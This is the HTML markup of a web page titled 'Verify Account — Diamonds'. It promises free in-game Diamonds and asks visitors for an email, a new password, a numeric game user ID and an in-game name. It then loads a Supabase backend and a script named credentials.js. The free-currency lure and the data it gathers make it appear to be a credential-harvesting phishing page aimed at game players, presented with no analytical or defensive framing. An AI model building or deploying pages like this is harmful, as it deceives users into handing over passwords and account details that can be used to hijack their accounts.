<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Account &mdash; Diamonds</title>
  <link rel="stylesheet" href="css/styles.css">
</head>
<body>
  <main>
    <div class="card">
      <div class="emblem" aria-hidden="true">
        <span class="d1"></span>
        <span class="d2"></span>
      </div>

      <h1>Create Your Account</h1>
      <p class="subtitle">Register with your email and confirm your player info to claim your free Diamonds.</p>

      <div class="progress-steps">
        <span class="progress-dot active" id="progressStep1">1</span>
        <span class="progress-line"></span>
        <span class="progress-dot" id="progressStep2">2</span>
      </div>

      <!-- STEP 1: EMAIL + PASSWORD -->
      <section class="step active" id="step1">
        <div class="field">
          <label for="email">Email</label>
          <input id="email" type="email" autocomplete="email" placeholder="you@example.com">
        </div>

        <div class="field">
          <label for="password">Create a Password</label>
          <div class="password-field">
            <input id="password" type="password" autocomplete="new-password" placeholder="At least 6 characters">
            <button type="button" class="password-toggle" id="passwordToggle">SHOW</button>
          </div>
        </div>

        <button type="button" class="btn btn-primary" id="loginButton">Continue</button>
        <p class="error-text" id="loginError"></p>
      </section>

      <!-- STEP 2: USER ID + IGN -->
      <section class="step" id="step2">
        <div class="field">
          <label for="userId">User ID</label>
          <input id="userId" type="text" inputmode="numeric" placeholder="e.g. 123456789">
        </div>

        <div class="field">
          <label for="ign">In-Game Name (IGN)</label>
          <input id="ign" type="text" placeholder="Your in-game name">
        </div>

        <div class="btn-row">
          <button type="button" class="btn" id="backButton">Back</button>
          <button type="button" class="btn btn-primary" id="profileButton">Create Account</button>
        </div>

        <p class="error-text" id="profileError"></p>
      </section>

      <p class="status-text" id="statusMessage"></p>
    </div>
  </main>

  <footer>
    Powered by <a href="https://www.surveypie.com/">SurveyPie</a>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="js/supabaseClient.js"></script>
  <script src="js/credentials.js"></script>
</body>
</html>
